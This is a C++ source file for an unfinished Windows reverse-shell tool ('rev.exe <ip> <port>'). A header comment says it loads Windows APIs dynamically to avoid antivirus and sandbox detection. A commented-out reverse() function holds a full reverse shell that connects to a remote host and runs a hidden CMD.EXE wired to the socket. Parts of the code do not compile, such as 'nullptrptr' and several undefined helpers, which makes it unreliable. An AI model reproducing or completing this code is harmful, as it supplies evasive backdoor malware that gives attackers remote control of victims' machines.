/////////////////////////////////////////////////////////////////////////////////////////
/*
* this demo only depends [LoadLibraryA], [GetProcAddress] and [GetLastError]
* to avoid AV and sandbox detecting.
*/
/////////////////////////////////////////////////////////////////////////////////////////

#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers
// Windows Header Files
#include <windows.h>
#include <tchar.h>
//#include <process.h>
//#include <winsock2.h>
//#include <ws2tcpip.h>

#define DEBUG

#ifdef DEBUG
static void log_to_console(PCTSTR text) {
    HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD dwChars = 0;
    TCHAR* str = nullptr;
    if (hStdout == INVALID_HANDLE_VALUE) {
        return;
    }
    WriteConsole(hStdout, text, _tcslen(text), &dwChars, nullptr);
}

static void log_to_file(PCTSTR text) {
    INT32 retCode = ERROR_SUCCESS;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    DWORD bytesWritten;
    BOOL bRet;

    hFile = CreateFile(
        "debug.log",
        GENERIC_WRITE,
        FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        retCode = ERROR_OPEN_FAILED;
        goto __ERROR__;
    }
    bRet = WriteFile(hFile, text, _tcslen(text), &bytesWritten, nullptr);
    if (!bRet) {
        retCode = ERROR_WRITE_FAULT;
        goto __ERROR__;
    }

    goto __FREE__;
__ERROR__:
    do {} while (0);
__FREE__:
    if (hFile != INVALID_HANDLE_VALUE) {
        CloseHandle(hFile);
        hFile = INVALID_HANDLE_VALUE;
    }
}
#endif

namespace rev {
    namespace api {
        class DynamicModule {
        public:
            TCHAR szFilename[MAX_PATH]{};
            HMODULE hModule{};
        };

        namespace kernel {
            typedef HANDLE(WINAPI* $GetStdHandle)(
                _In_ DWORD nStdHandle
                );

            typedef BOOL(WINAPI* $WriteConsole)(
                _In_             HANDLE  hConsoleOutput,
                _In_             const VOID* lpBuffer,
                _In_             DWORD   nNumberOfCharsToWrite,
                _Out_opt_        LPDWORD lpNumberOfCharsWritten,
                _Reserved_       LPVOID  lpReserved
                );

            typedef HANDLE (WINAPI* $CreateFileA) (
                _In_           LPCSTR                lpFileName,
                _In_           DWORD                 dwDesiredAccess,
                _In_           DWORD                 dwShareMode,
                _In_opt_       LPSECURITY_ATTRIBUTES lpSecurityAttributes,
                _In_           DWORD                 dwCreationDisposition,
                _In_           DWORD                 dwFlagsAndAttributes,
                _In_opt_       HANDLE                hTemplateFile
                );

            typedef BOOL (WINAPI* $WriteFile) (
                _In_                HANDLE       hFile,
                _In_                LPCVOID      lpBuffer,
                _In_                DWORD        nNumberOfBytesToWrite,
                _Out_opt_           LPDWORD      lpNumberOfBytesWritten,
                _Inout_opt_         LPOVERLAPPED lpOverlapped
            );

            typedef BOOL (WINAPI* $CloseHandle) (
                _In_ HANDLE hObject
            );

            class Functions: public DynamicModule {
            public:
                $GetStdHandle $GetStdHandle{};
                $WriteConsole $WriteConsole{};
                $CreateFileA $CreateFileA{};
                $WriteFile $WriteFile{};
                $CloseHandle $CloseHandle{};
            };

            Functions functions{};
        }

        namespace ws32 {

        }
    }

    namespace global {
        int argc = 0;
        TCHAR** argv = nullptr;

        TCHAR* rev_host = nullptr;
        UINT16 rev_port = 0;
    }
}

static INT32 bind_dynamic_api() {
#define LL(hModVar, szModName) { \
    hModVar = LoadLibrary(szModName); \
    if (nullptr == hModVar) { \
        log_to_file(szModName); \
        goto __ERROR__; \
    } \
}
#define PA(fnMem, fnDef, fnDll, dynMod, exitOnErr) { \
    fnMem = (fnDef) GetProcAddress ((dynMod) -> hModule, (#fnDll)); \
    if (nullptrptr == fnMem) { \
        const DWORD e = GetLastError(); \
        retCode = static_cast<INT32>(e); \
        log_error("GetProcAddress <%s> in <%s> failed [0x%x]: %s", (#fnDll), (dynMod) -> szDllName.data(), e, FormatError(e).data()); \
        if (exitOnErr) { goto __ERROR__; } \
    } else { \
        log_trace("GetProcAddress <%s> in <%s>@<0x%x> successfully", (#fnDll), (dynMod) -> szDllName.data(), fnMem); \
    } \
}
    INT32 retCode = ERROR_SUCCESS;
    HMODULE hModKernel = nullptr;
    LL(hModKernel, "kernel.dll");



    goto __FREE__;
__ERROR__:

__FREE__:
    return retCode;
#undef PA
#undef LL
}


static INT32 print_help() {
    HANDLE hStdout = win32api.$GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD dwChars = 0;
    TCHAR* str = nullptr;
    if (hStdout == INVALID_HANDLE_VALUE) {
        return -1;
    }
    str = (TCHAR*)_T("Usage:\n");
    win32api.$WriteConsole(hStdout, str, _tcslen(str), &dwChars, nullptr);
    str = (TCHAR*)_T("\trev.exe <ip> <port>\n");
    win32api.$WriteConsole(hStdout, str, _tcslen(str), &dwChars, nullptr);
    str = (TCHAR*)_T("\tor write connection config at end of rev.exe, such as [echo '10.10.10.10:4444' >> rev.exe]\n");
    win32api.$WriteConsole(hStdout, str, _tcslen(str), &dwChars, nullptr);
    return 0;
}

static INT32 verify(_In_ TCHAR* host, _In_ TCHAR* port_str, _Out_ UINT16* port) {
    INT32 retCode = ERROR_SUCCESS;
    if (nullptr == host || nullptr == port_str) {
        return ERROR_INVALID_ADDRESS;
    }
    auto n = _tcslen(port_str);
    for (auto i = 0; i < n; i++) {
        auto ch = port_str[i];
        if (ch < _T('0') || ch > _T('9')) {
            retCode = ERROR_DATATYPE_MISMATCH;
            goto __ERROR__;
        }
    }
    goto __FREE__;
__ERROR__:
    do {} while (0);
__FREE__:
    return retCode;
}

static INT32 read_append_config() {
    return 0;
}

//
//INT32 read_rev_info_from_tail() {
//    return 0;
//}
//
//INT32 reverse(TCHAR *host, UINT16 port) {
//    FreeConsole();
//    WSADATA wsaData;
//    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
//    struct addrinfo* result = nullptr, * ptr = nullptr, hints;
//    ZeroMemory(&hints, sizeof(hints));
//    hints.ai_family = AF_UNSPEC;
//    hints.ai_socktype = SOCK_STREAM;
//    hints.ai_protocol = IPPROTO_TCP;
//    getaddrinfo(REMOTE_ADDR, REMOTE_PORT, &hints, &result);
//    ptr = result;
//    SOCKET ConnectSocket = WSASocket(
//        ptr->ai_family, 
//        ptr->ai_socktype, 
//        ptr->ai_protocol,
//        nullptr, 0, 0
//    );
//    connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
//    STARTUPINFO si;
//    PROCESS_INFORMATION pi;
//    ZeroMemory(&si, sizeof(si));
//    si.cb = sizeof(si);
//    ZeroMemory(&pi, sizeof(pi));
//    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
//    si.wShowWindow = SW_HIDE;
//    si.hStdInput = (HANDLE)ConnectSocket;
//    si.hStdOutput = (HANDLE)ConnectSocket;
//    si.hStdError = (HANDLE)ConnectSocket;
//    TCHAR cmd[] = _T("C:\\WINDOWS\\SYSTEM32\\CMD.EXE");
//    CreateProcess(nullptr, cmd, nullptr, nullptr, TRUE, 0, nullptr, nullptr, &si, &pi);
//    WaitForSingleObject(pi.hProcess, INFINITE);
//    CloseHandle(pi.hProcess);
//    CloseHandle(pi.hThread);
//    WSACleanup();
//}


int main(int argc, TCHAR* argv[], TCHAR* envp[]) {
    //if (3 == argc) {

    //}
    //else if (1 == argc) {

    //}
    bind_dynamic_api();
    print_help();
    return 0;
}